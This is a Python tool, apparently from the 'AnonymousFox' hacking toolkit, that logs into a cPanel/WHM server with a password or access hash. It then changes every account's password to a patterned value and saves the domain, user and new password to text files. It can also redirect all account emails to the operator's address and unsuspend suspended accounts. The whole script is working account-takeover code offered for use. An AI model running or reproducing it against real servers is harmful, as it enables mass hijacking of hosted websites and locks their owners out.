import re, sys, requests, os, random, string, time
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

def input_Fox(txt):
	try :
		if (sys.version_info[0] < 3):
			return raw_input(txt).strip()
		else :
			sys.stdout.write(txt)
			return input()
	except:
		return False

def ran(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def content_Fox(req):
	try :
		try :
			return str(req.content.decode('utf-8'))
		except UnicodeEncodeError:
			try :
				return str(req.content.encode('utf-8'))
			except UnicodeDecodeError:
				return str(req.content)
	except :
		return str(req.text)

def log() :
	log =  """  
   {}[#]{} Create By ::
	{}  ___                                                    ______        
	{} / _ \                                                   |  ___|       
	{}/ /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
	{}|  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
	{}| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  < 
	{}\_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\ 
	{}                          __/ |
	{}                         |___/ {}WHM {}v1
	""".format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fw, fg)
	for line in log.split("\n"):
		print(line)
		time.sleep(0.15)

requests.packages.urllib3.disable_warnings()


def changePasswordP(ip, idcp, cookies, userWHM):
	try :
		if (':2087' in ip) :
			protocol = 'https://'
			port = ':2083'
			ipcp = ip.replace('2087', '2083')
		elif (':2086' in ip) :
			protocol = 'http://'
			port = ':2082'
			ipcp = ip.replace('2086', '2082')
		else :
			protocol = 'https://'
			port = ':2083'
			ipcp = ip+':2083'
		print (' {} [*] Change Password for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = cookies.get('{}/{}/scripts4/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)
		for user in users:
			try :
				if (str(userWHM) != str(user[0])):
					newPasswd = "f0x@" + ran(3) + "FoX" + ran(3) + "#x"
					getToken = cookies.get('{}/{}/scripts4/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=30)
					getToken = content_Fox(getToken)
					token = re.findall(re.compile('name=passwordtoken value=\'(.*)\''),getToken)[0]
					domain = re.findall(re.compile('user="{}" domain="(.*)" suspended="0"'.format(user[0])), getToken)[0]
					postchangeP = {'password': newPasswd, 'user': user[0], 'passwordtoken': token, 'enablemysql': '1'}
					changePR = cookies.post('{}/{}/scripts/passwd'.format(ip, idcp), verify=False, data=postchangeP, timeout=30)
					if (changePR) :
						print (' {} [+] {}{}{}|{}{}'.format(fw,fg,user[0],fw,fr,newPasswd))
						open('cPanels-WHM-Domain.txt', 'a').write('{}{}{}|{}|{}\n'.format(protocol, domain, port, user[0], newPasswd))
						open('cPanels-WHM-Host.txt', 'a').write('{}|{}|{}\n'.format(ipcp, user[0], newPasswd))
			except:
				pass
	except :
		print (' {}[-] Failed'.format(fr))

def changePasswordA(ip, userWHM, headers) :
	try :
		if (':2087' in ip) :
			protocol = 'https://'
			port = ':2083'
			ipcp = ip.replace('2087', '2083')
		elif (':2086' in ip) :
			protocol = 'http://'
			port = ':2082'
			ipcp = ip.replace('2086', '2082')
		else :
			protocol = 'https://'
			port = ':2083'
			ipcp = ip+':2083'
		print (' {} [*] Change Password for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = requests.get('{}/scripts4/listaccts?viewall=1'.format(ip), verify=False, headers=headers, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)
		for user in users:
			try :
				if (str(userWHM) != str(user[0])):
					newPasswd = "f0x@" + ran(3) + "FoX" + ran(3) + "#x"
					getToken = requests.get('{}/scripts4/listaccts?viewall=1'.format(ip), verify=False, headers=headers, timeout=30)
					getToken = content_Fox(getToken)
					token = re.findall(re.compile('name=passwordtoken value=\'(.*)\''),getToken)[0]
					domain = re.findall(re.compile('user="{}" domain="(.*)" suspended="0"'.format(user[0])), getToken)[0]
					postchangeP = {'password': newPasswd, 'user': user[0], 'passwordtoken': token, 'enablemysql': '1'}
					changePR = requests.post('{}/scripts/passwd'.format(ip), verify=False, headers=headers, data=postchangeP, timeout=30)
					if (changePR) :
						print (' {} [+] {}{}{}|{}{}'.format(fw,fg,user[0],fw,fr,newPasswd))
						open('cPanels-WHM-Domain.txt', 'a').write('{}{}{}|{}|{}\n'.format(protocol, domain, port, user[0], newPasswd))
						open('cPanels-WHM-Host.txt', 'a').write('{}|{}|{}\n'.format(ipcp, user[0], newPasswd))
			except:
				pass
	except :
		print (' {}[-] Failed'.format(fr))

def changeEmailP(ip, idcp, cookies , email) :
	try :
		print ('\n {} [*] Change Email for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = cookies.get('{}/{}/scripts4/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)
		for user in users:
			try :
				postchangeE = {'email': email, 'user': user[0]}
				changeER = cookies.post('{}/{}/scripts2/dochangeemail'.format(ip, idcp), verify=False, data=postchangeE, timeout=30)
				if (changeER) :
					print (' {} [+] {}{}{} => Email changed successfully'.format(fw, fr, user[0], fg))
			except:
				pass
	except:
		print (' {}[-] Failed'.format(fr))

def changeEmailA(ip, headers, email) :
	try :
		print ('\n {} [*] Change Email for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = requests.get('{}/scripts4/listaccts?viewall=1'.format(ip), verify=False, headers=headers, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="0"'), getUser)
		for user in users:
			try :
				postchangeE = {'email': email, 'user': user[0]}
				changeER = requests.post('{}/scripts2/dochangeemail'.format(ip), verify=False, headers=headers, data=postchangeE, timeout=30)
				if (changeER) :
					print (' {} [+] {}{}{} => Email changed successfully'.format(fw, fr, user[0], fg))
			except:
				pass
	except:
		print (' {}[-] Failed'.format(fr))

def unSuspendedP(ip, idcp, cookies) :
	try :
		print (' {} [*] UnSuspended for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = cookies.get('{}/{}/scripts4/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="1"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="1"'), getUser)
		for user in users:
			try :
				unSuspendedER = cookies.get('{}/{}/scripts2/suspendacct?domain={}&user={}&unsuspend-user=UnSuspend'.format(ip, idcp, user[1], user[0]), verify=False, timeout=30)
				if (unSuspendedER) :
					unSuspendedER = content_Fox(unSuspendedER)
					if ('has been unsuspended' in unSuspendedER) :
						print (' {} [+] {}{}{} => UnSuspended successfully'.format(fw, fr, user[0], fg))
					else :
						print (' {} [-] {}{}{} => UnSuspended failed'.format(fw, fg, user[0], fr))
				else :
					print (' {} [-] {}{}{} => UnSuspended failed'.format(fw, fg, user[0], fr))
			except :
				pass
	except:
		print (' {}[-] Failed'.format(fr))

def unSuspendedA(ip, headers) :
	try :
		print (' {} [*] UnSuspended for All users ..... {}(Waiting)\n'.format(fw, fr))
		getUser = requests.get('{}/scripts4/listaccts?viewall=1'.format(ip), headers=headers, verify=False, timeout=60)
		getUser = content_Fox(getUser)
		users = []
		if (re.findall(re.compile('user="(.*)" domain="(.*)" suspended="1"'), getUser)):
			users = re.findall(re.compile('user="(.*)" domain="(.*)" suspended="1"'), getUser)
		for user in users:
			try :
				unSuspendedER = requests.get('{}/scripts2/suspendacct?domain={}&user={}&unsuspend-user=UnSuspend'.format(ip, user[1], user[0]), headers=headers, verify=False, timeout=30)
				if (unSuspendedER) :
					unSuspendedER = content_Fox(unSuspendedER)
					if ('has been unsuspended' in unSuspendedER) :
						print (' {} [+] {}{}{} => UnSuspended successfully'.format(fw, fr, user[0], fg))
					else :
						print (' {} [-] {}{}{} => UnSuspended failed'.format(fw, fg, user[0], fr))
				else :
					print (' {} [-] {}{}{} => UnSuspended failed'.format(fw, fg, user[0], fr))
			except:
				pass
	except:
		print (' {}[-] Failed'.format(fr))

def WHM():
	log()
	try :
		print ('   [1] {}Change Users Password via {}[Password]'.format(fw, fg))
		print ('   [2] {}Change Users Password via {}[Accesshash]'.format(fw, fr))
		print ('   [3] {}Change Users Email via {}[Password]'.format(fw, fg))
		print ('   [4] {}Change Users Email via {}[Accesshash]'.format(fw, fr))
		print ('   [5] {}UnSuspended Users via {}[Password]'.format(fw, fg))
		print ('   [6] {}UnSuspended Users via {}[Accesshash]'.format(fw, fr))
		print ("   [0] {}Exit".format(fw))
		try :
			w = int(input_Fox('\n --> : '))
		except:
			print("\n  {}Choose from 0-6, please!\n".format(fr))
		if (w != 1 and w != 2 and w != 3 and w != 4 and w != 5  and w != 6):
			print ("\n      {}Go to hell :P\n".format(fr))
			sys.exit(0)
		ip = str(input_Fox('\n  WHM URL  ==> : '))
		if (ip[-1] is '/'):
			ip = ip[:-1]
		username = str(input_Fox('  USERNAME ==> : '))
		if (w == 1 or w == 3 or w == 5) :
			password = str(input_Fox('  Password ==> : '))
		elif (w == 2 or w == 4 or w == 6) :
			accesshash = str(input_Fox('  Accesshash ==> : '))
			if ('\n' in accesshash):
				accesshash = accesshash.replace('\n', '')
		req = requests.session()
		if (w == 1 or w == 3 or w == 5):
			postlogin = {'user':username,'pass':password,'login_submit':'Log in','goto_uri':'/'}
			login = req.post(ip + '/login/',verify=False, data=postlogin, timeout=30)
			login = content_Fox(login)
			if ('Account_Functions' in login or 'src="/cpsess' in login) :
				print (' {} [+] Login successful\n'.format(fg))
				if (re.findall(re.compile('window.COMMON.securityToken = "(.*)/(.*)";'),login)):
					idcp = re.findall(re.compile('window.COMMON.securityToken = "(.*)/(.*)";'),login)[0][1]
				elif (re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'),login)):
					idcp = re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'), login)[0][1]
				elif (re.findall(re.compile('href="/cpsess(.*)/'),login)):
					idcp = 'cpsess'+re.findall(re.compile('href="/cpsess(.*)/"'), login)[0]
				elif (re.findall(re.compile('src="/cpsess(.*)/scripts/'),login)):
					idcp = 'cpsess' + re.findall(re.compile('src="/cpsess(.*)/scripts/'), login)[0]
				if (w == 3):
					email = str(input_Fox('  Your Email ==> : '))
				if (w == 1):
					changePasswordP(ip, idcp, req, username)
				elif (w ==3) :
					changeEmailP(ip, idcp, req, email)
				elif (w == 5):
					unSuspendedP(ip, idcp, req)
				print ('')
			else :
				print (' {} [-] Login failed\n'.format(fr))
		elif (w == 2 or w == 4 or w == 6) :
			headers = {'Authorization' : 'WHM {}:{}'.format(username,accesshash)}
			login = req.get(ip, verify=False, headers=headers, timeout=30)
			login = content_Fox(login)
			if ('Account_Functions' in login):
				print (' {} [+] Login successful\n'.format(fg))
				if (w == 4) :
					email = str(input_Fox('  Your Email ==> : '))
				if (w == 2) :
					changePasswordA(ip, username, headers)
				elif (w == 4) :
					changeEmailA(ip, headers, email)
				elif (w == 6) :
					unSuspendedA(ip, headers)
				print ('')
			else :
				print (' {} [-] Login failed\n'.format(fr))
	except :
		pass

WHM()
input_Fox('  {}[{}!{}] {}Press Enter to exit'.format(fw, fr, fw, fc))